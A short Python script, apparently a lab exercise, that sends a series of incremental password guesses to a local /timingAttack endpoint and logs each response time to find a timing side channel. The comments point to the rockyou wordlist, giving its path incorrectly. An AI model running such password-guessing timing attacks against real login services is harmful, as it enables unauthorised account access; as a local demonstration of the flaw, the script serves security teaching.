import requests
import time

timingattack_url = "http://127.0.0.1:5000/timingAttack"

# Guesses array: Normally this would be from a wordlist 
## If you didn't fiddle with your kali for pentesting, check out rockyou.txt at only if you have tar it first!
### cat /etc/usr/share/wordlists/rockyou.txt
#### Go google how to tar if you dk
guesses= ["A","Pa","Pas","Pass","Passw","Passwo","Passwor","Password","Password1"]

for guess in guesses:
    data = {"password": guess}


    start = time.perf_counter()
    r = requests.post(url=timingattack_url, data=data)
    end = time.perf_counter()


    elapsed_time = end - start

    with open("./knockknock_RESULTS2.txt","a") as file:
        file.write(f"Current Guess: {guess}, Response Time:{elapsed_time} \n")